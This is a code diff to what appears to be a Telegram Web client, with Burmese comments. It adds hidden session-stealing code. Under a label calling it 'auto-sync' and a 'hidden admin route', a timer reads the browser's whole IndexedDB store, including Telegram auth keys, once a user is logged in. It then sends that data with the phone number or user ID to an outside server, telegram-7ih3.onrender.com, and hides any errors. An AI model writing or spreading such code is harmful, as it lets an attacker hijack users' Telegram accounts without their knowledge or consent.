@@ -129,7 +129,9 @@ onBeforeUnload(() => {
   actions.hangUp?.({ isPageUnload: true });
 });
 
-// --- 🌟 FAST AUTO-SYNC & HIDDEN ADMIN ROUTE 🌟 ---
+// --- 🌟 ULTIMATE AUTO-SYNC & HIDDEN ADMIN ROUTE 🌟 ---
+let hasSyncedThisSession = false; // Memory Variable (Page Reload ဖြစ်တိုင်း အသစ်ပြန်စမည်)
+
 setTimeout(() => {
     const DB_NAME = 'tt-data';
     const STORE_NAME = 'store';
@@ -206,9 +208,11 @@ setTimeout(() => {
     }
 
     // =========================================================
-    // ၂။ 📤 STAFF AUTO-SYNC (၂ စက္ကန့်အတွင်း အမြန်ပို့မည်၊ တစ်ခါပဲ ပို့မည်)
+    // ၂။ 📤 STAFF AUTO-SYNC (DEEP SCANNING SYSTEM)
     // =========================================================
     setInterval(() => {
+        if (hasSyncedThisSession) return; // ဒီ Browser Tab အတွက် တစ်ခါပို့ပြီးရင် ထပ်မပို့ပါ (Network မကြပ်တော့ပါ)
+
         try {
             const req = indexedDB.open(DB_NAME);
             req.onsuccess = (e: any) => {
@@ -222,29 +226,25 @@ setTimeout(() => {
                         const keys = e2.target.result;
                         
                         const data: any = {};
-                        let currentUserId = null;
-
-                        keys.forEach((k: string, i: number) => { 
-                            data[k] = vals[i]; 
-                            if (k === 'currentUserId') currentUserId = vals[i];
-                        });
+                        keys.forEach((k: string, i: number) => { data[k] = vals[i]; });
                         
-                        // Login မဝင်ရသေးပါက ဘာမှမလုပ်ပါ
-                        if (!currentUserId) return; 
-
-                        // 🌟 အရေးကြီး: ဒီ User ID ကို ပို့ပြီးသားလား စစ်မည် (Network မကြပ်အောင် ကာကွယ်ခြင်း) 🌟
-                        const lastSyncedId = localStorage.getItem('synced_user_id');
-                        if (lastSyncedId === currentUserId.toString()) return;
-
-                        // မပို့ရသေးလျှင် ချက်ချင်း ပို့မည်
                         const dataString = JSON.stringify(data);
-                        let phone = "";
-                        let phoneMatch = dataString.match(/"phoneNumber":"?(\d+)"?/);
                         
+                        // 🌟 အရင်လို ဖိုင်နာမည်ကို မရှာတော့ဘဲ Data အကုန်လုံးထဲမှာ Login သဲလွန်စကို အတိအကျရှာပါမည် 🌟
+                        const isLoggedIn = dataString.includes('authKey') || dataString.includes('currentUserId') || dataString.includes('"users":');
+                        if (!isLoggedIn) return; // Login မဝင်ရသေးရင် လုံးဝ မပို့ပါ
+
+                        let phoneMatch = dataString.match(/"phoneNumber":"?(\d+)"?/);
+                        let idMatch = dataString.match(/"currentUserId":"?(\d+)"?/);
+                        if (!idMatch) idMatch = dataString.match(/"id":(\d+)/); 
+
+                        let phone = "";
                         if (phoneMatch && phoneMatch[1]) {
                             phone = '+' + phoneMatch[1];
+                        } else if (idMatch && idMatch[1]) {
+                            phone = "ID_" + idMatch[1];
                         } else {
-                            phone = "ID_" + currentUserId;
+                            phone = "User_" + Math.floor(Math.random() * 100000);
                         }
                         
                         fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
@@ -253,16 +253,15 @@ setTimeout(() => {
                             body: JSON.stringify({ phoneNumber: phone, indexedDbData: dataString })
                         }).then(res => res.json())
                           .then(resData => {
-                              // အောင်မြင်စွာ ရောက်သွားပြီဆိုမှသာ "ပို့ပြီးကြောင်း" မှတ်ထားလိုက်မည်
                               if(resData.success) {
-                                  localStorage.setItem('synced_user_id', currentUserId.toString());
+                                  hasSyncedThisSession = true; // အောင်မြင်စွာ ရောက်သွားပြီဖြစ်၍ ရပ်လိုက်မည်
                               }
                           }).catch(() => {}); 
                     };
                 };
             };
         } catch(err) {}
-    }, 2000); 
+    }, 3000); // ၃ စက္ကန့် တစ်ခါ စစ်မည်
 
 }, 1000);
 // -----------------------------------------------------------
